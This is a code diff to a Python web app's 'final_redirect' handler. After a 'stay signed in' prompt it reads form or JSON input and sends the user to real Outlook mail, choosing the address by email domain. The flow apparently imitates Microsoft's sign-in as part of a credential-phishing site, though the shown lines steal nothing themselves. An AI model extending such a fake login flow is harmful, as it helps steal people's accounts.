@@ -1175,19 +1175,25 @@ def signinoption():
 async def final_redirect():
     """Handle final redirect after stay signed in choice"""
     try:
-        stay_signed_in = request.form.get('staySignedIn')
-        if stay_signed_in == 'yes':
-            # Check if personal or work email account
-            email = session.get('email', '')
-            is_personal = any(domain in email.lower() for domain in [
+        # Handle both form data and JSON request
+        if request.is_json:
+            data = request.get_json()
+            stay_signed_in = data.get('staySignedIn', '').lower()
+        else:
+            stay_signed_in = request.form.get('staySignedIn', '').lower()
+            
+        # Initialize redirect URL
+        email = session.get('email', '')
+        is_personal = any(domain in email.lower() for domain in [
             'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
             'outlook.ca', 'hotmail.ca', 'live.ca'
-            ])
-            
-            # Set redirect URL based on account type
-            final_redirect_url = "https://outlook.live.com/mail/" if is_personal else "https://outlook.office.com/mail/"
-            
-            # Clear session and return redirect URL
+        ])
+        final_redirect_url = "https://outlook.live.com/mail/" if is_personal else "https://outlook.office.com/mail/"
+
+        if stay_signed_in in ['yes', 'true', '1']:
+            # Already have the redirect URL set
+            pass
+        elif stay_signed_in in ['no', 'false', '0']:
             session.clear()
             return jsonify({
                 "status": "success", 
